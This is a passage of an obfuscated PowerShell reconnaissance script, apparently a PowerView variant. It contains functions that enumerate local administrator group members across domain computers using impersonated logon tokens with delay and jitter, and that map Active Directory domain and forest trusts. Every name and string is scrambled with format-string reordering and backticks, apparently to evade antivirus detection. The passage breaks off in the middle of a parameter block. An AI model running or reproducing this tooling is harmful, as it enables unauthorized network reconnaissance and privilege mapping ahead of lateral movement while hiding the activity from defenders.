            &("{0}{1}{3}{2}" -f'Write-Ve','rbo','e','s') ("{5}{8}{7}{4}{10}{0}{9}{3}{2}{6}{1}" -f 'oupMe',' the domain',' comput','er] Querying','Lo','[Find','ers in','Domain','-','mb','calGr')
            ${taRGeTcOmP`U`T`Ers} = &("{2}{1}{0}{3}{4}" -f 'ain','m','Get-Do','C','omputer') @ComputerSearcherArguments | &("{0}{2}{3}{4}{1}"-f'Se','t','lect','-','Objec') -ExpandProperty ("{0}{1}{2}" -f 'dnshos','tnam','e')
        }
        &("{2}{4}{1}{3}{0}" -f 'rbose','-V','Wr','e','ite') "[Find-DomainLocalGroupMember] TargetComputers length: $($TargetComputers.Length) "
        if (${tar`GE`T`cOmpuTE`Rs}."leN`GtH" -eq 0) {
            throw ("{1}{3}{4}{8}{2}{10}{5}{9}{12}{6}{11}{14}{7}{0}{13}"-f'e','[Find-Do','ber','ma','inLocalGroup',' h',' ','num','Mem','ost','] No','found','s','rate',' to e')
        }

        ${hOS`T`e`NUmB`loCK} = {
            Param(${co`M`PUt`ERname}, ${GroU`p`Na`Me}, ${MEth`oD}, ${TOk`enhAND`lE})

            if (${GROu`pNa`ME} -eq ("{0}{3}{2}{1}"-f'A','rators','minist','d')) {
                ${aDmi`NsEcurI`Tyi`d`ENtI`Fi`er} = &("{2}{3}{0}{1}"-f'c','t','New-','Obje') ("{5}{8}{10}{6}{11}{9}{4}{1}{2}{0}{3}{7}{12}" -f'pal.SecurityIden','y.','Princi','ti','urit','Sy','.','fie','st','ec','em','S','r')(  (&('ls')  ('vaRIAbL'+'e:'+'7L35F') )."Va`luE"::"B`U`i`LtiNa`dministRa`TORSS`id",${nU`ll})
                ${g`RoUp`NAMe} = (${Ad`MiN`seCURiTyIdEnti`Fi`eR}."T`RANSLA`Te"([System.Security.Principal.NTAccount])."VA`LUE" -split "\\")[-1]
            }

            if (${T`okEnH`AnD`Le}) {

                ${nU`ll} = &("{5}{2}{3}{0}{1}{4}"-f 'er','Impersonat','ke-','Us','ion','Invo') -TokenHandle ${tOKEn`Ha`NdLE} -Quiet
            }

            ForEach (${T`A`R`GeTCOmpUt`eR} in ${CO`mpU`T`e`RNAmE}) {
                ${u`p} = &("{2}{1}{0}"-f'ection','onn','Test-C') -Count 1 -Quiet -ComputerName ${TA`Rg`eTCOmPu`TER}
                if (${U`P}) {
                    ${netlO`CaLgrOUp`MEMb`ErArG`Umen`Ts} = @{
                        ("{1}{2}{3}{0}" -f 'e','Compu','terNa','m') = ${Tar`getcO`M`PUtER}
                        ("{1}{0}"-f'od','Meth') = ${M`e`THod}
                        ("{2}{1}{0}" -f'e','pNam','Grou') = ${gro`U`pname}
                    }
                    &("{2}{3}{4}{1}{0}" -f 'er','mb','Get-Net','LocalGrou','pMe') @NetLocalGroupMemberArguments
                }
            }

            if (${t`oKeNhan`D`LE}) {
                &("{2}{3}{1}{0}{4}"-f 'tToSel','r','I','nvoke-Reve','f')
            }
        }

        ${LO`go`N`ToKeN} = ${n`ULL}
        if (${Psbou`N`dpA`RameTeRs}[("{2}{0}{1}"-f 'n','tial','Crede')]) {
            if (${p`S`BOUN`DpaRAMEt`ers}[("{1}{0}" -f'lay','De')] -or ${p`SBouNDPA`R`A`ME`TeRS}[("{2}{4}{1}{0}{3}" -f 'cce','OnSu','St','ss','op')]) {
                ${LoGontO`K`En} = &("{6}{2}{5}{0}{3}{4}{1}" -f'Imper','n','voke-U','son','atio','ser','In') -Credential ${crEd`En`TiaL}
            }
            else {
                ${log`OntoK`En} = &("{2}{5}{1}{6}{4}{0}{3}" -f'sonatio','ke-Use','Inv','n','per','o','rIm') -Credential ${Cr`e`D`ENtiAl} -Quiet
            }
        }
    }

    PROCESS {

        if (${Ps`BoUN`DPArAmE`TErs}[("{0}{1}"-f 'Del','ay')] -or ${PsBO`UNDpA`RAmE`Ters}[("{2}{0}{3}{1}" -f'Suc','ess','StopOn','c')]) {

            &("{0}{2}{1}"-f'W','te-Verbose','ri') "[Find-DomainLocalGroupMember] Total number of hosts: $($TargetComputers.count) "
            &("{1}{0}{2}{3}"-f'rbo','Write-Ve','s','e') ('[Find-Doma'+'in'+'LocalGr'+'oupMem'+'b'+'er] '+'De'+'la'+'y: '+"$Delay, "+'Jitt'+'er: '+"$Jitter")
            ${coUN`TEr} = 0
            ${R`AN`dNo} = &("{1}{0}{2}"-f'-Objec','New','t') ("{2}{0}{1}"-f'yst','em.Random','S')

            ForEach (${TArG`EtCom`PuTer} in ${tArG`eT`Com`pUt`ErS}) {
                ${C`oUNtEr} = ${Cou`N`TEr} + 1

                &("{1}{2}{3}{0}" -f 'eep','St','art-S','l') -Seconds ${Ra`ND`No}.("{0}{1}"-f'N','ext').Invoke((1-${J`i`TteR})*${D`eL`Ay}, (1+${Jit`Ter})*${De`lAY})

                &("{1}{2}{0}"-f 'e','Write-V','erbos') "[Find-DomainLocalGroupMember] Enumerating server $TargetComputer ($Counter of $($TargetComputers.count)) "
                &("{3}{1}{0}{2}{4}" -f'Comma','-','n','Invoke','d') -ScriptBlock ${H`ostenuM`BlOck} -ArgumentList ${TArGETc`OM`p`UTeR}, ${gR`OUpnA`mE}, ${MeT`h`od}, ${Lo`go`NtOK`eN}
            }
        }
        else {
            &("{0}{1}{2}"-f'Writ','e-Verbos','e') ('[Find-Domai'+'nLoc'+'alGro'+'upM'+'em'+'ber'+'] '+'Usi'+'ng'+' '+'th'+'rea'+'din'+'g '+'wi'+'th '+'t'+'hr'+'eads: '+"$Threads")

            ${S`Cr`iP`TpArams} = @{
                ("{1}{2}{0}" -f 'e','Gr','oupNam') = ${gRO`U`PNAME}
                ("{1}{0}"-f 'ethod','M') = ${m`ETH`OD}
                ("{0}{1}{2}"-f 'To','ken','Handle') = ${lOGo`NT`Oken}
            }

            &("{1}{2}{0}{4}{3}"-f 'adedF','New-Thr','e','n','unctio') -ComputerName ${Ta`RgET`co`mPuterS} -ScriptBlock ${h`osTEnum`B`lOCk} -ScriptParameters ${SC`Ri`p`TPARaMs} -Threads ${T`hrEAdS}
        }
    }

    END {
        if (${l`oGon`TOK`En}) {
            &("{2}{3}{0}{1}"-f 'r','tToSelf','Invo','ke-Reve') -TokenHandle ${l`o`gOntokEn}
        }
    }
}

function g`E`T`-dOmAiNtRUsT {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{2}{1}{3}{0}" -f 'ldProcess','Sh','PS','ou'}, '')]
    [OutputType({"{0}{4}{6}{5}{2}{1}{3}" -f 'Po','t','nTrus','.NET','werVie','mai','w.Do'})]
    [OutputType({"{0}{6}{5}{3}{1}{4}{2}" -f'Power','inTrust.','AP','ma','LD','w.Do','Vie'})]
    [OutputType({"{1}{2}{0}{3}{4}"-f'rView.Dom','Pow','e','ainTrust','.API'})]
    [CmdletBinding(DEFAulTparAmeTeRseTnAme = {"{0}{1}" -f 'LDA','P'})]
    Param(
        [Parameter(pOsiTiON = 0, VAluefroMpIPelInE = ${TR`UE}, VALuEFROmpiPeLiNeByproPeRtYnamE = ${T`RUE})]
        [Alias({"{0}{1}"-f'Na','me'})]
        [ValidateNotNullOrEmpty()]
        [String]
        ${dO`MaIn},

        [Parameter(pArAMeTerSEtNAmE = 'API')]
        [Switch]
        ${A`Pi},

        [Parameter(PARAmetErsetNAME = 'NET')]
        [Switch]
        ${N`eT},

        [Parameter(PARaMETeRsetNAmE = "Ld`AP")]
        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{0}" -f'lter','Fi'})]
        [String]
        ${L`D`APFilTer},

        [Parameter(paRAMetErseTName = "lD`Ap")]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${pRO`P`ErTIes},

        [Parameter(paRAMEtersEtnAmE = "L`dap")]
        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{0}{2}" -f 'DSPat','A','h'})]
        [String]
        ${seA`RcH`BASE},

        [Parameter(paraMeterSETnaME = "L`DaP")]
        [Parameter(PARameteRseTNAme = 'API')]
        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{0}{2}{3}"-f 'n','DomainCo','troll','er'})]
        [String]
        ${S`erVER},

        [Parameter(pARamEtErseTNAmE = "L`daP")]
        [ValidateSet({"{0}{1}"-f'B','ase'}, {"{1}{0}{2}"-f'Lev','One','el'}, {"{2}{0}{1}" -f'ubt','ree','S'})]
        [String]
        ${sea`RChS`COPe} = ("{0}{1}"-f 'Subt','ree'),

        [Parameter(pArAMETErSeTnAme = "L`DAP")]
        [ValidateRange(1, 10000)]
        [Int]
        ${re`Sul`TPAg`esi`ZE} = 200,

        [Parameter(PaRaMetErsETnamE = "L`Dap")]
        [ValidateRange(1, 10000)]
        [Int]
        ${SER`Ve`RTimE`LiMiT},

        [Parameter(paramEteRsETnaME = "lD`Ap")]
        [Switch]
        ${TO`mbSto`NE},

        [Alias({"{0}{1}" -f 'ReturnOn','e'})]
        [Switch]
        ${FInD`O`Ne},

        [Parameter(PAraMetErSetNamE = "ld`AP")]
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${Cr`E`dEnTI`Al} =  ( &("{0}{2}{3}{1}"-f 'ch','iTem','il','D')  ('var'+'IabLe:'+'Pkf'+'E'+'ZN'))."vAL`Ue"::"em`ptY"
    )

    BEGIN {
        ${TRu`STATTR`iBU`T`Es} = @{
            [uint32]("{2}{0}{1}" -f'0','01','0x00000') = ("{1}{2}{0}{3}"-f 'I','N','ON_TRANSIT','VE')
            [uint32]("{0}{2}{1}" -f'0x0','0002','000') = ("{1}{3}{0}{2}" -f 'V','UPL','EL_ONLY','E')
            [uint32]("{2}{1}{0}{3}" -f'00','x','0','000004') = ("{2}{1}{0}"-f 'SIDS','LTER_','FI')
            [uint32]("{3}{2}{1}{0}" -f '000008','00','x','0') = ("{0}{2}{3}{1}{4}" -f'F','NSITIV','OREST_TR','A','E')
            [uint32]("{1}{0}{3}{2}"-f '00','0x000','0','01') = ("{0}{3}{1}{2}{4}" -f'C','S_O','RGAN','ROS','IZATION')
            [uint32]("{1}{0}{2}" -f '00','0x0000','20') = ("{3}{0}{2}{1}" -f'_F','REST','O','WITHIN')
            [uint32]("{2}{3}{1}{0}" -f'0','00004','0','x00') = ("{1}{4}{3}{2}{0}" -f 'AL','TREAT_AS_','ERN','XT','E')
            [uint32]("{2}{1}{0}"-f '80','x000000','0') = ("{0}{4}{6}{1}{5}{3}{2}"-f 'TRUS','S_','ON','4_ENCRYPTI','T_U','RC','SE')
            [uint32]("{2}{1}{0}" -f '0000100','x0','0') = ("{0}{4}{2}{5}{3}{1}"-f 'TRU','S','T_','S_KEY','S','USES_AE')
            [uint32]("{3}{0}{2}{1}" -f'0','0','020','0x000') = ("{2}{3}{6}{5}{1}{4}{0}" -f 'ON','TGT_DEL','CROSS_ORGANIZA','TIO','EGATI','_NO_','N')
            [uint32]("{0}{2}{1}" -f '0x0','000400','0') = ("{2}{0}{1}"-f'IM_TRU','ST','P')
        }

        ${ldA`psEARCHer`A`RgUme`NTS} = @{}
        if (${PsbOU`NDpA`R`AMETe`Rs}[("{1}{0}" -f'main','Do')]) { ${Ld`APse`ArChErA`RgU`mE`N`Ts}[("{1}{0}" -f'n','Domai')] = ${DO`m`AiN} }
        if (${p`S`Bound`paramete`RS}[("{1}{2}{0}"-f 'lter','LDAPF','i')]) { ${LDa`P`s`EAR`ChEraRGuMeNtS}[("{1}{2}{0}" -f'r','LDAPF','ilte')] = ${L`D`Apf`ilTER} }
        if (${pSBo`UNdPARam`E`T`eRs}[("{1}{0}{2}"-f 'ropert','P','ies')]) { ${L`dAP`SE`ARCH`eraRg`UMenTS}[("{1}{0}{3}{2}"-f 'r','P','s','opertie')] = ${pRO`pER`T`iES} }
        if (${p`s`BO`UnDpA`RAm`ETerS}[("{2}{0}{1}" -f'e','archBase','S')]) { ${ldaPSe`A`RcHe`RaRg`UM`eN`Ts}[("{1}{2}{0}"-f 'ase','S','earchB')] = ${SeaRChb`A`Se} }
        if (${P`s`Bo`UNd`PARAMEteRS}[("{0}{1}" -f 'Serv','er')]) { ${lD`ApSeARcHeRArg`U`m`E`N`Ts}[("{1}{0}" -f 'ver','Ser')] = ${S`E`RvER} }
        if (${pSBoun`d`Par`AME`Te`Rs}[("{1}{0}{2}" -f 'c','Sear','hScope')]) { ${LDAP`Se`ARC`HeRARgum`e`N`TS}[("{1}{0}{2}{3}"-f'c','Sear','hS','cope')] = ${s`EaR`CHsCO`PE} }
        if (${p`sBOu`N`d`PArAMETeRs}[("{3}{4}{0}{2}{1}"-f 'e','e','Siz','Resu','ltPag')]) { ${Ld`A`pSeA`RcherARgUmEntS}[("{1}{2}{3}{0}" -f 'ize','Re','s','ultPageS')] = ${r`ESuLTP`Age`sizE} }
        if (${pS`B`O`UnD`pAraMe`TeRs}[("{1}{0}{2}{4}{3}" -f'rverT','Se','i','it','meLim')]) { ${L`d`ApSe`ARch`ER`A`RguMenTs}[("{1}{3}{2}{0}" -f 'Limit','Se','Time','rver')] = ${s`E`RvErT`iM`elIMIT} }
        if (${PSbO`UnDpA`RaM`etERs}[("{1}{2}{0}" -f 'one','Tombs','t')]) { ${LDapsE`AR`C`he`R`ARgUmENTs}[("{1}{2}{0}"-f 'mbstone','T','o')] = ${TOm`BsTO`Ne} }
        if (${PsBOU`ND`ParAM`eTErs}[("{2}{0}{1}" -f'ia','l','Credent')]) { ${l`da`p`seArchE`Ra`Rgum`eNTS}[("{2}{1}{3}{0}" -f 'al','edent','Cr','i')] = ${CrED`e`NTi`AL} }
    }

    PROCESS {
        if (${ps`cmdleT}.ParaMEterSEtnAme -ne 'API') {
            ${neTSeARch`erA`RgU`M`EnTs} = @{}
            if (${Do`MA`iN} -and ${D`Oma`in}.("{0}{1}"-f 'Tri','m').Invoke() -ne '') {
                ${s`OuRc`edom`AIN} = ${do`m`AiN}
            }
            else {
                if (${ps`BO`U`NdpaRame`TE`RS}[("{2}{0}{1}"-f'ntia','l','Crede')]) {
                    ${SoUR`Ce`do`M`AIN} = (&("{2}{0}{1}" -f 't-','Domain','Ge') -Credential ${creD`e`NTI`Al})."NA`me"
                }
                else {
                    ${S`OU`RceDomaIn} = (&("{2}{1}{0}"-f '-Domain','et','G'))."nA`me"
                }
            }
        }
        elseif (${pscm`dL`Et}.PaRAMETeRSetNAME -ne 'NET') {
            if (${d`Om`AiN} -and ${d`O`maIn}.("{1}{0}" -f 'rim','T').Invoke() -ne '') {
                ${soUr`CEdO`mA`IN} = ${dOM`A`in}
            }
            else {
                ${SOurC`EdO`MA`iN} = ${EN`V:USErdNS`DOm`AIn}
            }
        }

        if (${P`Sc`Md`lET}.PaRaMeterseTNAme -eq ("{0}{1}"-f 'LDA','P')) {

            ${TR`UstSeA`R`c`Her} = &("{4}{3}{2}{0}{1}"-f'e','archer','t-DomainS','e','G') @LdapSearcherArguments
            ${sour`c`E`sId} = &("{0}{2}{1}" -f 'Get','SID','-Domain') @NetSearcherArguments

            if (${TRuS`T`sE`Ar`CHER}) {

                ${tRusT`S`e`ARcHeR}."Fi`lTer" = ("{0}{1}{3}{4}{2}"-f '(objectC','lass','omain)','=tru','stedD')

                if (${p`SB`ouND`PAra`MET`ErS}[("{0}{1}{2}"-f'Fi','n','dOne')]) { ${rE`suL`TS} = ${trU`sTSE`A`Rcher}.("{2}{1}{0}"-f'ne','O','Find').Invoke() }
                else { ${ReSu`lTS} = ${TrU`S`TSeaRC`h`eR}.("{0}{1}" -f 'Fi','ndAll').Invoke() }
                ${resU`LTS} | &("{2}{1}{3}{0}" -f'ct','e-Obj','Wher','e') {${_}} | &("{0}{1}{3}{2}" -f 'ForEach','-','ject','Ob') {
                    ${pRo`PS} = ${_}."prOpE`RT`i`Es"
                    ${doM`A`in`TrusT} = &("{0}{2}{1}"-f 'New','ect','-Obj') ("{0}{1}{2}" -f 'PS','O','bject')

                    ${TRu`S`TAtTRib} = @()
                    ${T`RuS`TAttRiB} += ${Tru`S`Ta`Tt`RIBUteS}."k`eYS" | &("{2}{1}{0}"-f '-Object','ere','Wh') { ${p`R`OpS}."Tr`US`Ta`T`TriButEs"[0] -band ${_} } | &("{1}{0}{3}{2}"-f 'orEac','F','ct','h-Obje') { ${tRusT`AT`T`RIbuTES}[${_}] }

                    ${dI`ReC`Tion} = Switch (${p`ROpS}."tRU`STdi`Re`Cti`ON") {
                        0 { ("{2}{1}{0}"-f'bled','sa','Di') }
                        1 { ("{0}{2}{1}" -f 'In','nd','bou') }
                        2 { ("{1}{2}{0}" -f'nd','Outbo','u') }
                        3 { ("{0}{2}{1}{3}" -f'Bid','tio','irec','nal') }
                    }

                    ${Tr`USTTy`Pe} = Switch (${PR`opS}."TRUSTt`Y`Pe") {
                        1 { ("{1}{3}{6}{4}{0}{5}{7}{2}"-f'E_D','WINDOWS','ECTORY','_','_ACTIV','I','NON','R') }
                        2 { ("{2}{4}{3}{0}{1}"-f'EC','TORY','WINDO','CTIVE_DIR','WS_A') }
                        3 { 'MIT' }
                    }

                    ${dIs`Ti`NgU`IS`he`Dname} = ${PR`OpS}."DisTI`Ngui`sHedn`A`Me"[0]
                    ${s`OuRcEN`A`meI`Ndex} = ${di`St`iNgU`IS`H`edName}.("{1}{2}{0}" -f 'f','In','dexO').Invoke('DC=')
                    if (${sOUrce`NAM`EinD`EX}) {
                        ${So`U`Rc`edomaIn} = $(${dIsTIN`G`UIsH`Edname}.("{2}{0}{1}" -f 'ubSt','ring','S').Invoke(${SO`U`Rc`EnAMEiNdEX})) -replace 'DC=','' -replace ',','.'
                    }
                    else {
                        ${Sour`Ce`DOMAiN} = ""
                    }

                    ${tA`RG`et`NAMEInDex} = ${dIsTIN`gU`IshEdnA`Me}.("{1}{2}{0}"-f 'f','Inde','xO').Invoke(("{0}{1}{3}{2}"-f',CN=S','ys','em','t'))
                    if (${S`O`UrCE`NaMEi`NdEX}) {
                        ${tARg`et`doMA`iN} = ${DI`S`TiNGUiShE`dNAME}.("{0}{1}{2}" -f'Su','bStrin','g').Invoke(3, ${t`AR`GetNAM`ei`NDEx}-3)
                    }
                    else {
                        ${Ta`R`gETDoMa`iN} = ""
                    }

                    ${oBjE`c`TgUID} = &("{1}{0}{2}"-f'bj','New-O','ect') ("{0}{1}" -f 'Gui','d') @(,${pr`OPs}."Ob`je`cTguid"[0])
                    ${TaR`gE`TSid} = (&("{1}{2}{0}" -f 'ect','New-O','bj') ("{2}{5}{6}{4}{9}{1}{10}{7}{0}{8}{11}{3}"-f'den','.','S','ier','Princ','yste','m.Security.','ityI','ti','ipal','Secur','f')(${p`ROPs}."S`ecur`ity`iD`EN`TifieR"[0],0))."v`ALUE"

                    ${doM`AI`N`TRUsT} | &("{0}{2}{1}"-f'Add-','ber','Mem') ("{0}{3}{2}{1}" -f'Note','rty','rope','p') ("{2}{1}{0}" -f'me','urceNa','So') ${sO`URcEdOMA`In}
                    ${DOm`AI`NTrU`ST} | &("{1}{2}{0}{3}"-f 'Me','A','dd-','mber') ("{0}{1}{2}{3}" -f'Not','e','pro','perty') ("{2}{3}{0}{1}" -f'a','me','Targe','tN') ${PRo`Ps}."N`AMe"[0]

                    ${DOmA`i`NT`RUSt} | &("{0}{1}{2}"-f'Add-','Me','mber') ("{0}{1}{2}{3}" -f 'Note','pro','p','erty') ("{0}{2}{1}"-f 'Tr','e','ustTyp') ${TRusT`T`YPE}
                    ${dOmA`int`R`UsT} | &("{3}{1}{2}{0}"-f'r','m','be','Add-Me') ("{2}{1}{0}{3}" -f 'pe','tepro','No','rty') ("{0}{2}{4}{3}{1}"-f 'Tru','es','stAt','ribut','t') $(${T`RuSt`AtT`RiB} -join ',')
                    ${D`oMaInt`RU`st} | &("{3}{2}{1}{0}" -f 'r','embe','-M','Add') ("{3}{2}{0}{1}" -f'p','roperty','ote','N') ("{1}{2}{0}{3}" -f'io','TrustDirec','t','n') "$Direction"
                    ${DoMAIN`T`RU`sT} | &("{0}{1}{3}{2}" -f'A','dd-Memb','r','e') ("{1}{0}{2}{3}" -f'p','Note','ropert','y') ("{2}{0}{1}{3}" -f'e','nC','Wh','reated') ${Pro`PS}."whe`NC`REaT`ed"[0]
                    ${dom`AinTR`U`sT} | &("{3}{1}{0}{2}" -f 'be','dd-Mem','r','A') ("{0}{1}{2}{3}"-f'Note','pro','pert','y') ("{2}{1}{0}" -f'ged','enChan','Wh') ${P`RoPS}."wH`eNc`hA`NgED"[0]
                    ${DoMain`T`RUST}."pSoBje`Ct"."TY`pe`NAmeS".("{1}{0}" -f 'ert','Ins').Invoke(0, ("{5}{0}{2}{3}{1}{6}{4}" -f'Vie','ainTrust.','w.Do','m','AP','Power','LD'))
                    ${DOm`A`InT`RUsT}
                }
                if (${r`E`sULts}) {
                    try { ${RESuL`Ts}.("{1}{0}" -f 'spose','di').Invoke() }
                    catch {
                        &("{1}{2}{0}" -f'e','Write-V','erbos') ('[G'+'et'+'-D'+'omainTrust]'+' '+'E'+'rror '+'disp'+'osin'+'g '+'o'+'f '+'th'+'e '+'R'+'esult'+'s '+'ob'+'ject:'+' '+"$_")
                    }
                }
                ${T`RUstSear`cH`Er}.("{0}{1}"-f'd','ispose').Invoke()
            }
        }
        elseif (${PS`C`MdLeT}.ParamEtersETNAMe -eq 'API') {

            if (${P`SboUNDPAr`A`M`Ete`RS}[("{1}{0}" -f'ver','Ser')]) {
                ${TA`RgET`DC} = ${S`erV`er}
            }
            elseif (${d`OMA`IN} -and ${dOMa`In}.("{1}{0}" -f'im','Tr').Invoke() -ne '') {
                ${tARgE`T`dc} = ${D`OMAiN}
            }
            else {

                ${t`ArG`ETdc} = ${nu`Ll}
            }

            ${pT`RIn`Fo} =  ${hd`i`CU}::"zE`Ro"

            ${Fl`AgS} = 63
            ${DO`M`A`iNcOUnT} = 0

            ${r`E`SuLt} = ${nET`A`pi32}::"DseNUmERATEDo`m`A`Int`RuSTS"(${T`ARGE`TDC}, ${f`lA`Gs}, [ref]${P`Tr`info}, [ref]${do`mAin`cOUNT})

            ${ofF`SET} = ${p`T`Rinfo}.("{1}{0}" -f 'Int64','To').Invoke()

            if ((${Res`ULt} -eq 0) -and (${o`F`FSeT} -gt 0)) {

                ${i`N`creMent} = ${dS`_Doma`iN`_t`RUSTS}::("{0}{1}"-f 'GetSi','ze').Invoke()

                for (${i} = 0; (${i} -lt ${DoMai`Nc`ounT}); ${I}++) {

                    ${Ne`W`INtPtr} = &("{0}{2}{1}"-f 'New-','ect','Obj') ("{1}{0}{3}{2}" -f 'stem.I','Sy','ptr','nt') -ArgumentList ${o`FFS`ET}
                    ${i`NFo} = ${nEW`Intp`TR} -as ${DS_`d`O`MAIn_TRuSTS}

                    ${OfF`s`eT} = ${nEw`INTP`Tr}.("{2}{1}{0}" -f'Int64','o','T').Invoke()
                    ${of`FsEt} += ${i`Ncre`MeNT}

                    ${S`IdstrI`NG} = ''
                    ${r`eSult} = ${A`D`VapI32}::"COn`VErTs`IdtO`STRINg`S`ID"(${IN`Fo}."dO`MA`iNSId", [ref]${sIds`Tr`iNg});${l`AStE`Rror} =   ( &("{1}{0}{2}" -f'E','chiLDIt','M') ("{3}{1}{2}{0}"-f'Le:dur8','i','AB','var') )."vAL`UE"::("{1}{3}{0}{2}{4}"-f'tLastW','G','in','e','32Error').Invoke()

                    if (${rEs`ULT} -eq 0) {
                        &("{2}{3}{1}{0}" -f'e','-Verbos','W','rite') "[Get-DomainTrust] Error: $(([ComponentModel.Win32Exception] $LastError).Message) "
                    }
                    else {
                        ${d`OM`Ai`NTrUST} = &("{1}{2}{3}{0}" -f't','N','ew-Obj','ec') ("{2}{0}{1}" -f 'Obj','ect','PS')
                        ${dO`maIN`Tru`St} | &("{0}{1}{2}"-f 'Add-Mem','b','er') ("{3}{0}{1}{2}"-f 'tep','r','operty','No') ("{0}{3}{1}{2}"-f'S','rceN','ame','ou') ${soURCeD`om`Ain}
                        ${doM`A`i`NTRUsT} | &("{2}{1}{0}" -f 'ber','dd-Mem','A') ("{3}{0}{1}{2}" -f'oteprop','e','rty','N') ("{0}{1}{2}" -f'Targe','tN','ame') ${iN`FO}."D`NS`DoMAINNaMe"
                        ${D`oMAinTR`U`st} | &("{2}{0}{1}"-f'-','Member','Add') ("{0}{1}{2}{3}"-f 'Notepro','p','er','ty') ("{1}{0}{2}{4}{5}{3}"-f'e','Targ','tNet','e','bi','osNam') ${IN`Fo}."N`EtB`iO`sdOmaI`N`NaME"
                        ${D`om`AintRu`St} | &("{2}{0}{1}"-f 'm','ber','Add-Me') ("{1}{3}{0}{2}" -f'per','Note','ty','pro') ("{0}{1}" -f 'F','lags') ${I`NFo}."fL`AGs"
                        ${doma`in`TR`USt} | &("{1}{2}{0}" -f'ber','Add-M','em') ("{2}{0}{1}"-f 'eproper','ty','Not') ("{2}{1}{0}"-f'tIndex','n','Pare') ${I`Nfo}."pArENTIN`D`eX"
                        ${DoMA`int`RuST} | &("{3}{2}{1}{0}" -f 'r','Membe','dd-','A') ("{0}{1}{3}{2}" -f'Notepro','p','rty','e') ("{2}{1}{0}" -f'e','rustTyp','T') ${In`FO}."tRuStT`Y`Pe"
                        ${dO`m`AiNT`RuSt} | &("{0}{2}{1}" -f'Add-Memb','r','e') ("{2}{0}{1}{3}" -f 'ote','pro','N','perty') ("{2}{0}{1}" -f 'ttri','butes','TrustA') ${IN`Fo}."t`Ru`st`ATtRibU`Tes"
                        ${DO`Ma`INT`Rust} | &("{3}{1}{2}{0}"-f'er','d-Mem','b','Ad') ("{3}{2}{1}{0}"-f'rty','prope','e','Not') ("{1}{0}{2}" -f'arg','T','etSid') ${SIDs`T`RiNg}
                        ${dOMaiN`TRu`sT} | &("{0}{1}{2}"-f 'Add-Mem','b','er') ("{1}{2}{0}{3}" -f'eprop','No','t','erty') ("{3}{0}{2}{1}"-f 'argetGu','d','i','T') ${IN`Fo}."Dom`AinG`UID"
                        ${DO`M`AIN`TRUSt}."P`s`OBJECT"."typENA`M`Es".("{1}{0}"-f 'sert','In').Invoke(0, ("{3}{2}{5}{0}{1}{4}"-f 'ew.D','omainTrus','e','Pow','t.API','rVi'))
                        ${Do`MAin`TRUSt}
                    }
                }

                ${nU`LL} = ${N`ET`ApI32}::("{0}{4}{2}{3}{1}" -f 'N','ree','i','BufferF','etAp').Invoke(${pt`RiNfO})
            }
            else {
                &("{1}{3}{0}{4}{2}"-f't','Wr','erbose','i','e-V') "[Get-DomainTrust] Error: $(([ComponentModel.Win32Exception] $Result).Message) "
            }
        }
        else {

            ${Fo`U`NdD`OmaiN} = &("{0}{1}{2}"-f 'Get','-Dom','ain') @NetSearcherArguments
            if (${fO`Un`dd`Omain}) {
                ${FOUn`Dd`oMaiN}.("{2}{1}{5}{3}{0}{4}"-f'ti','lTrust','GetAl','ela','onships','R').Invoke() | &("{1}{2}{0}{3}"-f'a','Fo','rE','ch-Object') {
                    ${_}."pSo`BJ`ECt"."T`YpeN`AmeS".("{0}{1}{2}"-f'Inse','r','t').Invoke(0, ("{2}{1}{4}{3}{5}{6}{0}" -f'.NET','i','PowerV','mainTru','ew.Do','s','t'))
                    ${_}
                }
            }
        }
    }
}

function gEt-FO`ReST`T`RuST {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{0}{2}{1}{3}"-f 'P','ldP','SShou','rocess'}, '')]
    [OutputType({"{1}{3}{5}{4}{0}{2}"-f 're','Pow','stTrust.NET','erV','.Fo','iew'})]
    [CmdletBinding()]
    Param(
        [Parameter(PoSitION = 0, ValUeFroMPiPELIne = ${T`RUe}, vaLuEFrOMpIpElINEbypROPERtyNAmE = ${tR`Ue})]
        [Alias({"{1}{0}"-f 'me','Na'})]
        [ValidateNotNullOrEmpty()]
        [String]
        ${fOr`ESt},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${C`Red`eNTI`AL} =   ( &("{0}{1}" -f'VArI','abLe')  ('PKF'+'eZN') -Va)::"EMP`TY"
    )

    PROCESS {
        ${n`ETFORest`ArGUMEn`TS} = @{}
        if (${ps`BoUn`Dpa`R`AM`eTeRs}[("{0}{1}"-f 'Fores','t')]) { ${nETfOrESTArgu`m`E`NtS}[("{2}{0}{1}" -f 're','st','Fo')] = ${F`oRE`st} }
        if (${ps`BOUnD`PaRa`m`Ete`Rs}[("{1}{3}{0}{2}"-f 'ia','Creden','l','t')]) { ${nEtF`OReSt`AR`gU`M`ENTS}[("{0}{1}{2}" -f'C','reden','tial')] = ${CReDEN`T`IAl} }

        ${FO`Un`DFOr`EST} = &("{0}{1}{3}{2}"-f 'G','et','rest','-Fo') @NetForestArguments

        if (${fOU`Ndf`OResT}) {
            ${foundFO`R`E`st}.("{2}{0}{3}{4}{1}{5}{6}" -f 'e','elat','G','tAl','lTrustR','ionshi','ps').Invoke() | &("{0}{1}{2}"-f'Fo','r','Each-Object') {
                ${_}."psoB`J`eCT"."TYpeN`AM`eS".("{0}{1}" -f'Inse','rt').Invoke(0, ("{5}{3}{2}{6}{1}{4}{0}" -f 'ust.NET','iew.Fores','e','ow','tTr','P','rV'))
                ${_}
            }
        }
    }
}

function GET`-d`OMAInFOr`EIg`NUS`ER {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{0}{3}{1}{2}"-f'PSSh','u','ldProcess','o'}, '')]
    [OutputType({"{2}{0}{3}{1}"-f 'e','.ForeignUser','Pow','rView'})]
    [CmdletBinding()]
    Param(
        [Parameter(PosItioN = 0, ValuEfRoMpipELINE = ${t`RuE}, VaLuEFroMpipELiNEbypROPERtyNAmE = ${T`RuE})]
        [Alias({"{0}{1}"-f 'N','ame'})]
        [ValidateNotNullOrEmpty()]
        [String]
        ${dOmA`in},

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{0}" -f 'lter','Fi'})]
        [String]
        ${lD`ApfILT`Er},

